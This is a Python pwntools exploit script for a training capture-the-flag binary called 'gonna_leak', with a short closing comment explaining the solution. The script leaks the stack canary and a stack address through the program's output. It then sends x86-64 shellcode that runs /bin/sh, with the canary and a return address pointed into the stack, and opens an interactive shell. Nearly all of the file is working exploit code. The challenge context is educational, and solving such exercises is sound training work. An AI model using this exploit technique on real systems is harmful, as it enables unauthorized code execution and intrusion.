from pwn import *
from sys import *

SERVER = "bin.training.offdef.it"
PORT = "2011"
BINARY = "./gonna_leak"


if "--remote" in sys.argv:
    r = remote(SERVER, PORT)
else:
    r = process(BINARY)

if "--debug" in sys.argv: 
    gdb.attach(r, """
        #breakpoints
        b* 0x4011cf
        b* 0x4011d9 
        c
        """)
    input("wait")


#code


#script for the OFFSET
#sleep(1)
#print(r.recv())
#for i in range(1, 200):
#    sleep(1)
#    print("OFFSET ", i)
#    r.send(b'A'*(i))
#    print(r.recv())

#r.interactive()

#new

sleep(1)
r.recv()
sleep(1)
r.send(b'A'*105)
r.recvuntil(b'> ')
r.read(105)
canary= b'\x00'+r.read(7)
canary = u64(canary)
print(" [!] canary found: %#x" % canary)

sleep(1)
r.send(b'A'*152)
r.recvuntil(b'> ')
r.read(152)
stack= r.read(6)+ b"\x00\x00"
stack = u64(stack)- 392
print("[!] stack found: %#x" % stack)


shellcode = b'\x90'+b'/bin/sh\x00\x48\x8D\x3D\x00\x00\x00\x00\x48\x83\xEF\x0F\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05'+b'\x90'*(104-1-26-8) + p64(canary) + 2* p64(stack+9)
sleep(1)
r.send(shellcode)
r.recv()

sleep(4)
r.sendline(b'')
r.recv()
r.interactive()


'''
This challenge was similar to "leakers". Basically you had to leak the canary and then understand how to jump in the stack. 
The only way to leak somenthing was by the print, so I did a script (now commented, comment everything and then make it run 
with arg --remote if you want to see the result) to discover all the possible leaks. 
After inspectioning the output of the script I saw that there was 2 constant offset: 105 (canary) and 
152 (somenthing). I understood that the one at 152 was somenthing constant also in remote. I calculated the offset of the buffer
(392) and then later I make my code jump in it. Because of the last send, you had to remember that
the first byte of the buffer was overwritten by \n. The multiple sleeps were usefull during debugging and 
to avoid the remote buffer to corrupt. 
'''